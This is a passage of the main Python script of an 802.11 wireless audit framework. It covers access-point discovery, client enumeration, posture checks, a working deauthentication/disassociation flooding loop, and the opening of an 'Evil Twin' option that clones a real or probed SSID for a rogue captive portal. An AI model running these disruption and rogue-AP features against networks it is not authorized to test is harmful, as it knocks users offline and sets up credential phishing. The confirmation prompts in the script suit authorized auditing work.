#!/usr/bin/env python3
"""
Title:   802.11 Wireless Audit Framework
Author:  Huzefa Khalil Dayanji
Role:    Security Consultant
Purpose: Modular OOP framework for automated 802.11 wireless auditing, interface management, and vulnerability assessment.
"""

# Standard python modules
import os
import sys
import argparse
import threading
import subprocess
import re
import time
from pathlib import Path
from itertools import zip_longest

from config import Config
from ui import UI
from dependencies import DependencyManager

# Ensure dependencies are met before importing heavy hitters
DependencyManager.check_and_fix()

# Lazy Imports (post-dependency-check)
from scapy.all import sniff
from pyroute2 import NL80211

from interface_manager import InterfaceManager
from audit_engine import WirelessAuditEngine

# -----------------------------------------------------------------------------
# MAIN EXECUTION FLOW
# -----------------------------------------------------------------------------

def main():
    parser = argparse.ArgumentParser(description="Professional 802.11 Audit Utility")
    parser.add_argument("--iface",        help="Wireless interface name")
    parser.add_argument("--hop-interval", type=float, default=0.05)
    parser.add_argument("--channels",     help="e.g. 1,6,11")
    parser.add_argument("--no-hop",       action="store_true")
    # --band: restrict hopping to a specific band.
    # Accepts '2g'/'2G'/'2' or '5g'/'5G'/'5' (case-insensitive).
    # If omitted, the hopper alternates between 2.4 GHz and 5 GHz channels.
    parser.add_argument(
        "--band",
        help="Band to scan: '2g' for 2.4 GHz only, '5g' for 5 GHz only. "
             "Omit to alternate between both bands (default).",
        metavar="BAND",
    )
    args = parser.parse_args()

    os.system('clear')
    UI.print_banner()

    # 1. Interface Selection
    iface = args.iface
    if not iface:
        UI.section("Interface Selection")
        UI.info("Enumerating wireless adapters...")
        adapters = [d.name for d in Path("/sys/class/net").iterdir() if (d / "wireless").is_dir()]
        if not adapters:
            UI.error("No wireless hardware found.")
            sys.exit(1)

        # Display available interfaces in a table before showing the menu
        iface_rows = [[f"{UI.BOLD}{i+1}{UI.RESET}", a] for i, a in enumerate(adapters)]
        print(f"\n{UI.CYAN}{UI.BOLD}  Available Interfaces{UI.RESET}")
        from tabulate import tabulate
        print(tabulate(iface_rows, headers=[f"{UI.BOLD}#{UI.RESET}", f"{UI.BOLD}Interface{UI.RESET}"], tablefmt="rounded_outline"))
        print()

        try:
            idx   = int(input(f"{UI.BOLD}  ❯ Select Interface [1-{len(adapters)}]: {UI.RESET}").strip() or 0) - 1
            if idx < 0:
                raise ValueError
            iface = adapters[idx]
        except (IndexError, ValueError, KeyboardInterrupt):
            UI.error("Invalid choice.\n")
            sys.exit(1)

    # 2. Monitor Mode Enforcement
    UI.section("Monitor Mode Setup")
    with NL80211() as iw:
        iw.bind()
        info = InterfaceManager.get_info(iw, iface)
        if info['current'] != "MONITOR":
            UI.warn(f"{iface} is in {info['current']} mode.")
            try:
                # normalize
                choice = input("  Switch to monitor mode? [Y/n]: ").strip().lower()
                if choice in ('', 'y', 'yes'):
                   InterfaceManager.set_state(iface, "down")
                   InterfaceManager.set_mode(iface, 6) # 6 for monitor mode
                   InterfaceManager.set_state(iface, "up")
                   UI.ok(f"{iface} is now in MONITOR mode.")
                elif choice in ('n', 'no'):
                   UI.info("Goodbye :>")
                   sys.exit(0)
                else:
                    UI.error("Invalid choice.")
                    sys.exit(1)
            except KeyboardInterrupt:
                print()
                UI.info("Goodbye :>")
                sys.exit(1)

    # 3. Startup
    # audit is created ONCE here so that audit.results (the discovered APs)
    # survive across menu iterations — they live in RAM for the whole session.
    audit = WirelessAuditEngine(iface)

    hopper_thread = None

    def start_hopper():
        nonlocal hopper_thread
        if args.no_hop:
            return
        if hopper_thread and hopper_thread.is_alive():
            return
        audit.stop_hopper.clear()
        hopper_thread = threading.Thread(
            target=audit.hopper_loop,
            args=(chans, args.hop_interval),
            daemon=True,
        )
        hopper_thread.start()

    def stop_hopper():
        audit.stop_hopper.set()
        if hopper_thread and hopper_thread.is_alive():
            hopper_thread.join(timeout=0.5)

    # --- Band / channel list resolution ---
    # Priority: --channels > --band > default (both bands alternated)
    if args.channels:
        # explicit channel list always wins
        chans = [int(c) for c in args.channels.split(',')]
    elif args.band:
        # normalise: strip trailing 'g'/'G', keep the digit(s)
        band_key = args.band.strip().lower().rstrip('g')  # '2g' → '2', '5G' → '5'
        if band_key == '2':
            chans = list(Config._2GHZ.keys())   # channels 1-14
            UI.info("Band locked to 2.4 GHz.")
        elif band_key == '5':
            chans = list(Config._5GHZ.keys())   # 5 GHz channels
            UI.info("Band locked to 5 GHz.")
        else:
            UI.error(f"Unknown band '{args.band}'. Use '2g' or '5g'.")
            sys.exit(1)
    else:
        # No --band given — interleave 2.4 GHz and 5 GHz channels so the
        # hopper visits both bands in a single sweep (2G ch, 5G ch, 2G ch, …)
        chans_2g = list(Config._2GHZ.keys())
        chans_5g = list(Config._5GHZ.keys())
        # zip_longest-style interleave; pad the shorter list by cycling it
        chans = [
            ch for pair in zip_longest(chans_2g, chans_5g)
            for ch in pair if ch is not None
        ]
        UI.info("No band specified — hopping across both 2.4 GHz and 5 GHz channels.")

    # -------------------------------------------------------------------------
    # 4. Main menu loop
    #
    # The loop keeps the script alive between operations so that audit.results
    # (APs discovered by option 1) remain in memory.  Ctrl+C behaviour:
    #   • ALL options → KeyboardInterrupt is caught locally → loop back to menu
    #
    # sniff() is always run in a daemon thread (never on the main thread) so
    # that Python owns SIGINT and KeyboardInterrupt is reliably catchable.
    # -------------------------------------------------------------------------
    while True:
        # Park the view on menu so background threads can't redraw tables
        # while the user is choosing. Each option sets its own view below.
        try:
            audit.set_view("menu")
        except Exception:
            pass
        # Show menu and get user's choice on every iteration
        user_choice = UI.show_menu()
        if not user_choice:
            # user chose 0 or sent EOF
            print()
            UI.info("Goodbye :>")
            break

        # Start (or restart) the hopper thread for this operation.
        # We reset the stop event first so the new thread isn't born stopped.
        # audit.stop_hopper.clear()
        # if not args.no_hop:
        #     threading.Thread(
        #         target=audit.hopper_loop,
        #         args=(chans, args.hop_interval),
        #         daemon=True,
        #     ).start()
        #     UI.ok(f"Hopper started on {len(chans)} channels.")
        start_hopper()

        UI.divider()

        # this is where i'll add more conditional based callback functions for scapy's sniff.
        if user_choice == 1:
            # we also want to make sure while switching to monitor mode
            # during step 2, we kill the process which could cause intereference
            # such as NetworkManager and wpa_supplicant
            try:
                audit.set_view("aps")
            except Exception:
                pass
            UI.section("Discovering Access Points")
            UI.info("Press Ctrl+C to stop scanning and return to the main menu...")

            # Run sniff() in a daemon thread so the MAIN thread stays free to
            # catch KeyboardInterrupt.  Scapy swallows SIGINT internally when
            # sniff() owns the main thread, which is why Ctrl+C was terminating
            # the script instead of being caught by our except block.
            stop_sniff = threading.Event()
            sniff_thread = threading.Thread(
                target=sniff,
                kwargs=dict(
                    iface=iface,
                    prn=audit.beacon_frame,
                    store=0,
                    # scapy's stop_filter is polled after every packet;
                    # when stop_sniff is set the thread exits cleanly.
                    stop_filter=lambda _pkt: stop_sniff.is_set(),
                ),
                daemon=True,
            )
            sniff_thread.start()
            try:
                sniff_thread.join()  # main thread blocks here — Ctrl+C is catchable
            except KeyboardInterrupt:
                # Signal the sniff thread to stop, then wait for it to finish.
                # Results are preserved in audit.results (in RAM).
                stop_sniff.set()
                sniff_thread.join()
                audit.stop_hopper.set()
                print()
                UI.ok(f"Scan stopped. {len(audit.results)} AP(s) found — returning to menu.")
                try:
                    _ch_count: dict = {}
                    _ssid_map: dict = {}
                    for _r in audit.results or []:
                        try:
                            _ch = str(_r[1]) if len(_r) > 1 else "?"
                            _ch_count[_ch] = _ch_count.get(_ch, 0) + 1
                            _ss = str(_r[3]).strip() if len(_r) > 3 else "?"
                            if _ss.lower() not in ("<hidden>", "<malformed>", "") \
                                    and not _ss.startswith("<"):
                                _ssid_map.setdefault(_ss.lower(), {"ssid": _ss, "bssids": set(),
                                                                   "encs": set(), "chs": set()})
                                _ssid_map[_ss.lower()]["bssids"].add(str(_r[0]))
                                if len(_r) > 4:
                                    _ssid_map[_ss.lower()]["encs"].add(str(_r[4]))
                                _ssid_map[_ss.lower()]["chs"].add(_ch)
                        except Exception:
                            continue
                    if _ch_count:
                        from tabulate import tabulate as _tab
                        _chrows = []
                        for _ch in sorted(_ch_count, key=lambda c: (c == "?", c)):
                            try:
                                _freq = audit._channel_to_freq(_ch)
                            except Exception:
                                _freq = "?"
                            _chrows.append([f"{UI.CYAN}{_ch}{UI.RESET}",
                                            f"{UI.DIM}{_freq}{UI.RESET}",
                                            f"{UI.GREEN}{_ch_count[_ch]}{UI.RESET}"])
                        print(_tab(_chrows, headers=["Channel", "Frequency", "APs"], tablefmt="pretty"))
                    _multi = {k: v for k, v in _ssid_map.items() if len(v["bssids"]) > 1}
                    if _multi:
                        from tabulate import tabulate as _tab2
                        _mrows = []
                        for _k in sorted(_multi, key=lambda k: len(_multi[k]["bssids"]), reverse=True):
                            _v = _multi[_k]
                            _mrows.append([
                                f"{UI.YELLOW}{_v['ssid']}{UI.RESET}",
                                f"{UI.BOLD}{len(_v['bssids'])}{UI.RESET}",
                                f"{UI.DIM}{', '.join(sorted(_v['encs']))[:40]}{UI.RESET}",
                                f"{UI.DIM}{', '.join(sorted(_v['chs']))}{UI.RESET}",
                            ])
                        UI.warn(f"{len(_multi)} SSID(s) on multiple BSSIDs — possible impersonation; "
                                f"verify against the approved inventory.")
                        print(_tab2(_mrows, headers=["SSID", "#BSSIDs", "Security Seen", "Channels"],
                                    tablefmt="pretty"))
                except Exception:
                    pass
                continue  # <── back to top of while loop → show menu again

        elif user_choice == 2:
            # ── Guard: AP scan must have been run first ────────────────────
            stop_hopper()
            if not audit.results:
                UI.error("No AP data found.")
                UI.warn("Please run option 1 (Discover Access Points) first, then retry.")
                audit.stop_hopper.set()
                continue  # back to menu instead of crashing out

            # ── Let user pick the target AP from the discovered list ───────
            UI.section("Enumerate Connected Devices")
            a_bssid, a_channel = UI.select_ap_from_results(audit.results, audit.table_headers)
            if not a_bssid:
                UI.info("No target selected. Returning to menu...")
                audit.stop_hopper.set()
                continue
            try:
                audit.set_view("clients")
            except Exception:
                pass
            UI.info("Press Ctrl+C to stop and return to the main menu...")

            # Same threaded sniff pattern as option 1 — keeps main thread free
            # to catch KeyboardInterrupt so Ctrl+C loops back to the menu.
            stop_sniff = threading.Event()
            sniff_thread = threading.Thread(
                target=sniff,
                kwargs=dict(
                    iface=iface,
                    prn=lambda pkt: audit.data_frames(pkt, a_bssid, iface, a_channel),
                    store=0,
                    # scapy's stop_filter is polled after every packet;
                    # when stop_sniff is set the thread exits cleanly.
                    stop_filter=lambda _pkt: stop_sniff.is_set(),
                ),
                daemon=True,
            )
            sniff_thread.start()
            try:
                sniff_thread.join()  # main thread blocks here — Ctrl+C is catchable
            except KeyboardInterrupt:
                stop_sniff.set()
                sniff_thread.join()
                audit.stop_hopper.set()
                print()
                UI.ok("Scan stopped — returning to menu.")
                continue  # <── back to top of while loop → show menu again

        elif user_choice == 3:
            stop_hopper()
            if not audit.results:
                UI.error("No AP data found.")
                UI.warn("Please run option 1 (Discover Access Points) first, then retry.")
                audit.stop_hopper.set()
                continue
            UI.section("Vulnerability Assessment")
            a_bssid, a_channel = UI.select_ap_from_results(audit.results, audit.table_headers)
            print(type(a_channel))
            if not a_bssid:
                UI.info("No target selected. Returning to menu...")
                audit.stop_hopper.set()
                continue
            try:
                audit.set_view("vuln")
            except Exception:
                pass
            InterfaceManager.set_channel(iface, a_channel)

            UI.info("Sending probe request and checking for a response...")
            got_response = audit.send_probe_request(ssid=a_bssid, iface=iface, channel=a_channel)

            if not got_response:
                UI.warn(
                    "AP did not respond to the Probe Request. It may have "
                    "SSID broadcast disabled, be out of range, on a different "
                    "channel than expected, or filtering probe requests. "
                    "Check main.py option 1 results for the correct channel/BSSID, "
                    "and try moving closer to the AP before retrying."
                )
                audit.stop_hopper.set()
                continue

            UI.ok("AP responded — proceeding with full assessment.")
            UI.info("Press Ctrl+C to stop and return to the main menu...")
            try:
                audit.set_view("vuln")
            except Exception:
                pass
            stop_sniff = threading.Event()
            sniff_thread = threading.Thread(
                target=sniff,
                kwargs=dict(
                    iface=iface,
                    prn=lambda pkt: audit.vuln_assessment(pkt, s_bssid=a_bssid, iface=iface, channel=a_channel),
                    store=False,
                    timeout=10,
                    stop_filter=lambda _pkt: stop_sniff.is_set(),
                ),
                daemon=True,
            )
            sniff_thread.start()
            try:
                sniff_thread.join()
            except KeyboardInterrupt:
                stop_sniff.set()
                sniff_thread.join()
                audit.stop_hopper.set()
                print()
                UI.ok("Assessment stopped — returning to menu.")
                try:
                    from posture import assess_from_engine, render_findings
                    _findings = assess_from_engine(audit, a_bssid)
                    if _findings:
                        render_findings(_findings, title=f"Posture Findings — {a_bssid}")
                except Exception:
                    pass
                continue

            # Sniff window ended on its own — still show structured findings
            # built from passive scan data (no extra packets sent).
            try:
                from posture import assess_from_engine, render_findings
                _findings = assess_from_engine(audit, a_bssid)
                if _findings:
                    render_findings(_findings, title=f"Posture Findings — {a_bssid}")
                else:
                    UI.warn("No posture findings — target left the scan results?")
            except Exception as e:
                UI.warn(f"Posture assessment unavailable: {e}")
            audit.stop_hopper.set()
            continue

        # elif user_choice == 4:
        #     UI.section("Deauthentication Attack")

        #     target_bssid = None
        #     target_channel = None

        #     if audit.results:
        #         target_bssid, target_channel = UI.select_ap_from_results(audit.results, audit.table_headers)
        #         if not target_bssid:
        #             UI.info("No target selected. Returning to menu...")
        #             audit.stop_hopper.set()
        #             continue
        #     else:
        #         UI.warn("No AP data found from option 1.")
        #         try:
        #             target_bssid = input("Enter target AP BSSID/MAC: ").strip()
        #             target_channel = input("Enter target channel: ").strip()
        #             target_channel = int(target_channel) if target_channel else None
        #         except (KeyboardInterrupt, ValueError):
        #             print()
        #             UI.info("Selection cancelled. Returning to menu...")
        #             audit.stop_hopper.set()
        #             continue

        #         if not target_bssid or target_channel is None:
        #             UI.error("Target BSSID and channel are required.")
        #             audit.stop_hopper.set()
        #             continue

        #     try:
        #         InterfaceManager.set_channel(iface, target_channel)
        #     except Exception as e:
        #         UI.error(f"Unable to switch channel: {e}")
        #         audit.stop_hopper.set()
        #         continue

        #     UI.info("Press Ctrl+C to stop and return to the main menu...")

        #     stop_sniff = threading.Event()
        #     sniff_thread = threading.Thread(
        #         target=sniff,
        #         kwargs=dict(
        #             iface=iface,
        #             prn=lambda pkt: audit.deauth_frame(
        #                 iface=iface,
        #                 transmitter_mac=target_bssid,
        #                 receiver_mac=target_bssid,
        #             ),
        #             store=0,
        #             stop_filter=lambda _pkt: stop_sniff.is_set(),
        #         ),
        #         daemon=True,
        #     )
        #     sniff_thread.start()

        #     try:
        #         sniff_thread.join()
        #     except KeyboardInterrupt:
        #         stop_sniff.set()
        #         sniff_thread.join()
        #         audit.stop_hopper.set()
        #         print()
        #         UI.ok("Deauth attack stopped — returning to menu.")
        #         continue
        elif user_choice == 4:
            stop_hopper()
            UI.section("Deauthentication Attack [ACTIVE / AUTHORIZED TESTING ONLY]")

            target_bssid = None
            target_channel = None

            if audit.results:
                target_bssid, target_channel = UI.select_ap_from_results(audit.results, audit.table_headers)
                if not target_bssid:
                    UI.info("No target selected. Returning to menu...")
                    audit.stop_hopper.set()
                    continue
            else:
                UI.warn("No AP data found from option 1.")
                try:
                    target_bssid = input("Enter target AP BSSID/MAC: ").strip()
                    target_channel = input("Enter target channel: ").strip()
                    target_channel = int(target_channel) if target_channel else None
                except (KeyboardInterrupt, ValueError):
                    print()
                    UI.info("Selection cancelled. Returning to menu...")
                    audit.stop_hopper.set()
                    continue

                if not target_bssid or target_channel is None:
                    UI.error("Target BSSID and channel are required.")
                    audit.stop_hopper.set()
                    continue
            try:
                InterfaceManager.set_channel(iface, int(target_channel))
            except Exception as e:
                UI.error(f"Unable to switch channel: {e}")
                audit.stop_hopper.set()
                continue

            mode = None
            while mode not in {"1", "2"}:
                UI.section("Target Mode")
                print("  1) Broadcast")
                print("  2) Unicast")
                mode = input("  Choose mode [1-2]: ").strip()

            UI.section("Disruption Frame Type [ACTIVE]")
            print("  1) Deauthentication (mgmt subtype 12)")
            print("  2) Disassociation (mgmt subtype 10)")
            frame_choice = input("  Choose frame [1-2] (default 1): ").strip() or "1"
            frame_subtype = 10 if frame_choice == "2" else 12
            frame_name = "Disassociation" if frame_subtype == 10 else "Deauthentication"
            UI.ok(f"{frame_name} frames selected.")

            def _confirm_deauth(tx: str, rx: str, label: str):
                """Explicit authorization + rate/count tuning for deauth.

                Returns (count, interval) or None if the user aborts.
                count 0 = run until Ctrl+C. Never targets anything but tx/rx.
                """
                UI.warn("ACTIVE DISRUPTION TEST — deauthentication/disassociation frames disconnect "
                        "clients. Run only against networks you are authorized to test.")
                UI.info(f"Target AP: {UI.CYAN}{tx}{UI.RESET}  Mode: {label}  "
                        f"Receiver: {UI.YELLOW}{rx}{UI.RESET}")
                try:
                    c_raw = input(f"{UI.BOLD}  ❯ Packet count [0 = until Ctrl+C]: {UI.RESET}").strip() or "0"
                    count = max(0, int(c_raw))
                    i_raw = input(f"{UI.BOLD}  ❯ Interval seconds between frames [0.1]: {UI.RESET}").strip() or "0.1"
                    interval = float(i_raw)
                    if interval < 0.01 or interval > 60:
                        UI.warn(f"Interval {interval}s out of range — using 0.1s.")
                        interval = 0.1
                except (KeyboardInterrupt, EOFError, ValueError):
                    print()
                    UI.info("Deauth setup cancelled.")
                    return None
                try:
                    confirm = input(f"{UI.BOLD}  ❯ Type the target AP BSSID to AUTHORIZE (Enter aborts): {UI.RESET}").strip()
                except (KeyboardInterrupt, EOFError):
                    print()
                    UI.info("Deauth aborted — no frames sent.")
                    return None
                if confirm.lower() != str(tx).lower():
                    UI.info("Deauth aborted — no frames sent.")
                    return None
                return count, interval

            if mode == "1":
                receiver_mac = "ff:ff:ff:ff:ff:ff"
                UI.ok("Broadcast mode selected.")
                params = _confirm_deauth(target_bssid, receiver_mac, f"Broadcast {frame_name}")
                if not params:
                    audit.stop_hopper.set()
                    continue
                deauth_count, deauth_interval = params
                UI.info(f"Sending {frame_name.lower()} frames (count={deauth_count or 'infinite'}, "
                        f"interval={deauth_interval}s)... Press Ctrl+C to stop and return to menu.")
                try:
                    audit.set_view("deauth")
                except Exception:
                    pass
                try:
                    audit.reset_deauth_counters()
                except Exception:
                    pass
                stop_deauth = threading.Event()

                def _deauth_loop(_tx=target_bssid, _rx=receiver_mac,
                                 _count=deauth_count, _interval=deauth_interval,
                                 _subtype=frame_subtype):
                    sent = 0
                    while not stop_deauth.is_set() and (_count <= 0 or sent < _count):
                        try:
                            audit.deauth_frame(iface=iface, transmitter_mac=_tx, receiver_mac=_rx,
                                               mgmt_subtype=_subtype)
                        except Exception:
                            pass
                        sent += 1
                        time.sleep(_interval)

                deauth_thread = threading.Thread(target=_deauth_loop, daemon=True)
                deauth_thread.start()
                try:
                    deauth_thread.join()
                except KeyboardInterrupt:
                    stop_deauth.set()
                    deauth_thread.join()
                    try:
                        audit.end_deauth_line()
                    except Exception:
                        pass
                    print()
                    UI.ok("Deauth attack stopped — returning to menu.")
                    audit.stop_hopper.set()
                    continue
                try:
                    audit.end_deauth_line()
                except Exception:
                    pass
                print()
                UI.ok("Deauth burst complete (packet count reached) — returning to menu.")
                audit.stop_hopper.set()
                continue

            try:
                InterfaceManager.set_channel(iface, int(target_channel))
            except Exception as e:
                UI.error(f"Unable to switch channel: {e}")
                audit.stop_hopper.set()
                continue

            UI.section("Enumerate Connected Devices")
            UI.info("Press Ctrl+C to stop and show connected clients...")
            try:
                audit.set_view("clients")
            except Exception:
                pass
            stop_sniff = threading.Event()
            sniff_thread = threading.Thread(
                target=sniff,
                kwargs=dict(
                    iface=iface,
                    prn=lambda pkt: audit.data_frames(pkt, target_bssid, iface, target_channel),
                    store=0,
                    stop_filter=lambda _pkt: stop_sniff.is_set(),
                ),
                daemon=True,
            )
            sniff_thread.start()

            try:
                sniff_thread.join()
            except KeyboardInterrupt:
                stop_sniff.set()
                sniff_thread.join()

            # Build client list from the engine's discovery results
            # (client_results rows: [ap_mac, ap_vendor, client_mac, client_vendor, status]).
            clients = []
            try:
                tb = str(target_bssid).lower()
                for row in getattr(audit, "client_results", []) or []:
                    try:
                        ap_mac = str(row[0]).lower()
                        cli = str(row[2])
                        if ap_mac == tb and cli:
                            clients.append(cli)
                    except Exception:
                        continue
                # Deduplicate, preserve order
                seen = set()
                uniq = []
                for c in clients:
                    cl = c.lower()
                    if cl not in seen:
                        seen.add(cl)
                        uniq.append(c)
                clients = uniq
                if not clients:
                    # Fallback to seen set (older runs)
                    clients = sorted(getattr(audit, "seen_clients", set()) or set())
            except Exception:
                clients = sorted(getattr(audit, "seen_clients", set()) or set())
            if not clients:
                UI.warn("No connected clients were discovered.")
                audit.stop_hopper.set()
                continue

            UI.section("Connected Clients")
            from tabulate import tabulate
            client_rows = [[f"{UI.BOLD}{i+1}{UI.RESET}", mac] for i, mac in enumerate(clients)]
            print(tabulate(client_rows, headers=["#", "Client MAC"], tablefmt="rounded_outline"))
            print()

            try:
                idx = int(input(f"Select client [1-{len(clients)}]: ").strip()) - 1
                if idx < 0 or idx >= len(clients):
                    raise ValueError
                selected_client = clients[idx]
            except (KeyboardInterrupt, ValueError):
                print()
                UI.info("Selection cancelled. Returning to menu...")
                audit.stop_hopper.set()
                continue

            UI.ok(f"Selected client: {selected_client}")
            params = _confirm_deauth(target_bssid, selected_client, f"Unicast {frame_name}")
            if not params:
                audit.stop_hopper.set()
                continue
            deauth_count, deauth_interval = params
            UI.info(f"Sending {frame_name.lower()} frames (count={deauth_count or 'infinite'}, "
                    f"interval={deauth_interval}s)... Press Ctrl+C to stop and return to menu.")
            try:
                audit.set_view("deauth")
            except Exception:
                pass
            try:
                audit.reset_deauth_counters()
            except Exception:
                pass
            stop_deauth = threading.Event()

            def _deauth_loop_uni(_tx=target_bssid, _rx=selected_client,
                                 _count=deauth_count, _interval=deauth_interval,
                                 _subtype=frame_subtype):
                sent = 0
                while not stop_deauth.is_set() and (_count <= 0 or sent < _count):
                    try:
                        audit.deauth_frame(iface=iface, transmitter_mac=_tx, receiver_mac=_rx,
                                           mgmt_subtype=_subtype)
                    except Exception:
                        pass
                    sent += 1
                    time.sleep(_interval)

            deauth_thread_uni = threading.Thread(target=_deauth_loop_uni, daemon=True)
            deauth_thread_uni.start()
            try:
                deauth_thread_uni.join()
            except KeyboardInterrupt:
                stop_deauth.set()
                deauth_thread_uni.join()
                try:
                    audit.end_deauth_line()
                except Exception:
                    pass
                print()
                UI.ok("Deauth attack stopped — returning to menu.")
                audit.stop_hopper.set()
                continue
            try:
                audit.end_deauth_line()
            except Exception:
                pass
            print()
            UI.ok("Deauth burst complete (packet count reached) — returning to menu.")
            audit.stop_hopper.set()
            continue

        elif user_choice == 5:
            # ── Rogue Access Point — Evil Twin with selectable captive portal ──
            # Logic mirrors wpf_complete.py EvilTwin (hostapd/dnsmasq/iptables/mitmproxy/Flask)
            # verbatim — only addition is portal template selection.
            stop_hopper()
            try:
                audit.set_view("evil")
            except Exception:
                pass
            UI.section("Rogue AP Simulation — Evil Twin (Captive Portal) [ACTIVE]")

            # Lazy import so the framework still starts even if Flask/mitmproxy are missing.
            try:
                from evil_twin import EvilTwin
            except ImportError as e:
                UI.error(f"Failed to load EvilTwin module: {e}")
                UI.warn("Ensure evil_twin.py is present and Flask is installed (pip install flask).")
                audit.stop_hopper.set()
                continue

            target_ssid: str | None = None
            target_channel: int | None = None
            target_bssid: str | None = None

            # ── Step 1: SSID / channel / BSSID ─────────────────────────────────
            # Sources: Discovered APs (option 1) and PNL Extracted list (option 6) — let user pick
            has_aps = bool(audit.results)
            has_pnl = bool(getattr(audit, 'probe_results', None) and len(audit.probe_results) > 0)
            # Build deduplicated PNL list (unique SSIDs, keep row with highest count)
            pnl_unique: dict = {}
            pnl_list: list = []
            if has_pnl:
                for row in audit.probe_results:
                    # row = [src_mac, vendor, ssid, count, last_seen]
                    try:
                        ssid = str(row[2]).strip()
                    except Exception:
                        continue
                    if not ssid or ssid in ("<Hidden>", "<wildcard>", "", None):
                        continue
                    if ssid not in pnl_unique or int(row[3]) > int(pnl_unique[ssid][3]):
                        pnl_unique[ssid] = row
                pnl_list = sorted(pnl_unique.values(), key=lambda r: int(r[3]), reverse=True)
                has_pnl = len(pnl_list) > 0

            # If either source exists, offer a unified source chooser (mirrors the AP clone prompt style)
            if has_aps or has_pnl:
                UI.info("Available SSID sources for Evil Twin (from previous scans):")
                src_rows = []
                src_map: dict = {}
                cur = 1
                if has_aps:
                    src_rows.append([f"{UI.BOLD}{cur}{UI.RESET}", f"{UI.CYAN}Discovered APs{UI.RESET}", f"{len(audit.results)} AP(s) — BSSID/channel known", "Clone exact AP"])
                    src_map[str(cur)] = "aps"
                    cur += 1
                if has_pnl:
                    src_rows.append([f"{UI.BOLD}{cur}{UI.RESET}", f"{UI.YELLOW}PNL (Probed SSIDs){UI.RESET}", f"{len(pnl_list)} unique SSID(s) from {len(audit.probe_results)} probes — SSID only", "Use probed SSID (enter channel)"])
                    src_map[str(cur)] = "pnl"
                    cur += 1
                src_rows.append([f"{UI.BOLD}{cur}{UI.RESET}", f"{UI.DIM}Manual{UI.RESET}", "Custom SSID", "Enter SSID/channel/BSSID"])
                src_map[str(cur)] = "manual"
                from tabulate import tabulate
                print(tabulate(src_rows, headers=[f"{UI.BOLD}#{UI.RESET}", f"{UI.BOLD}Source{UI.RESET}", f"{UI.BOLD}Details{UI.RESET}", f"{UI.BOLD}Note{UI.RESET}"], tablefmt="rounded_outline"))
                print()
                default_choice = "1"
                try:
                    choice_raw = input(f"{UI.BOLD}  ❯ Choose source [1-{len(src_map)}] (default {default_choice}): {UI.RESET}").strip() or default_choice
                except (KeyboardInterrupt, EOFError):
                    print()
                    UI.info("Cancelled. Returning to menu...")
                    audit.stop_hopper.set()
                    continue
                chosen_src = src_map.get(choice_raw)
                if not chosen_src:
                    UI.warn(f"Invalid choice '{choice_raw}' — defaulting to manual.")
                    chosen_src = "manual"

                if chosen_src == "aps":
                    a_bssid, a_channel = UI.select_ap_from_results(audit.results, audit.table_headers)
                    if not a_bssid:
                        UI.info("No target selected. Returning to menu...")
                        audit.stop_hopper.set()
                        continue
                    for row in audit.results:
                        if row[0] == a_bssid and str(row[1]) == str(a_channel):
                            raw_ssid = row[3]  # SSID now at index 3 after RSSI insertion
                            if raw_ssid in ("<Hidden>", "<Malformed>", "<hidden>", "", None):
                                UI.warn("Selected AP has hidden SSID — enter SSID manually.")
                                try:
                                    target_ssid = input(f"{UI.BOLD}  ❯ Enter SSID for Evil Twin: {UI.RESET}").strip()
                                except (KeyboardInterrupt, EOFError):
                                    print(); UI.info("Cancelled."); audit.stop_hopper.set(); continue
                                if not target_ssid:
                                    UI.error("SSID cannot be empty."); audit.stop_hopper.set(); continue
                            else:
                                target_ssid = str(raw_ssid)
                            target_bssid = str(a_bssid)
                            try:
                                target_channel = int(a_channel)
                            except Exception:
                                target_channel = int(row[1]) if str(row[1]).isdigit() else 6
                            break
                    if target_ssid:
                        UI.ok(f"Cloning AP → SSID: {UI.YELLOW}{target_ssid}{UI.RESET}  BSSID: {UI.CYAN}{target_bssid}{UI.RESET}  CH: {UI.CYAN}{target_channel}{UI.RESET}")
                    else:
                        UI.error("Could not resolve target AP. Returning to menu.")
                        audit.stop_hopper.set()
                        continue

                elif chosen_src == "pnl":
                    UI.section("PNL — Select SSID to Clone")
                    # Show unique PNL SSIDs sorted by count desc
                    from tabulate import tabulate
                    pnl_rows = []
                    for i, row in enumerate(pnl_list, start=1):
                        src_mac, vendor, ssid, count, last_seen = row
                        pnl_rows.append([
                            f"{UI.BOLD}{i}{UI.RESET}",
                            f"{UI.YELLOW}{ssid}{UI.RESET}",
                            f"{UI.DIM}{vendor}{UI.RESET}",
                            f"{UI.GREEN}{count}{UI.RESET}",
                            f"{UI.CYAN}{src_mac}{UI.RESET}",
                            f"{UI.DIM}{last_seen}{UI.RESET}"
                        ])
                    print(tabulate(pnl_rows, headers=[f"{UI.BOLD}#{UI.RESET}", f"{UI.BOLD}SSID (Probed){UI.RESET}", f"{UI.BOLD}Vendor{UI.RESET}", f"{UI.BOLD}Count{UI.RESET}", f"{UI.BOLD}Src MAC{UI.RESET}", f"{UI.BOLD}Last Seen{UI.RESET}"], tablefmt="rounded_outline"))
                    print(f"\n{UI.DIM}Showing {len(pnl_list)} unique SSID(s) from {len(audit.probe_results)} total probes. Pick one to use as Evil Twin SSID.{UI.RESET}\n")
                    try:
                        sel_raw = input(f"{UI.BOLD}  ❯ Select PNL SSID [1-{len(pnl_list)}]: {UI.RESET}").strip()
                        sel_idx = int(sel_raw) - 1
                        if sel_idx < 0 or sel_idx >= len(pnl_list):
                            raise ValueError
                        chosen_row = pnl_list[sel_idx]
                        target_ssid = str(chosen_row[2])
                        UI.ok(f"Selected PNL SSID → {UI.YELLOW}{target_ssid}{UI.RESET} (probed by {chosen_row[0]}, {chosen_row[3]}×, vendor {chosen_row[1]})")
                    except (ValueError, KeyboardInterrupt, EOFError):
                        print()
                        UI.info("Selection cancelled. Returning to menu...")
                        audit.stop_hopper.set()
                        continue
                    # PNL has no BSSID/channel — prompt for channel and optional spoof BSSID
                    try:
                        ch_raw = input(f"{UI.BOLD}  ❯ Enter channel for '{target_ssid}' [6]: {UI.RESET}").strip() or "6"
                        target_channel = int(ch_raw)
                        bssid_raw = input(f"{UI.BOLD}  ❯ Spoof BSSID for PNL SSID? (Enter to skip, or MAC): {UI.RESET}").strip() or None
                        if bssid_raw:
                            if bssid_raw.count(":") != 5:
                                UI.warn(f"BSSID '{bssid_raw}' doesn't look like a MAC — still using it.")
                            target_bssid = bssid_raw
                        else:
                            target_bssid = None
                    except (KeyboardInterrupt, EOFError, ValueError):
                        print()
                        UI.info("Cancelled. Returning to menu...")
                        audit.stop_hopper.set()
                        continue

                else:  # manual
                    pass  # fall through to manual block below

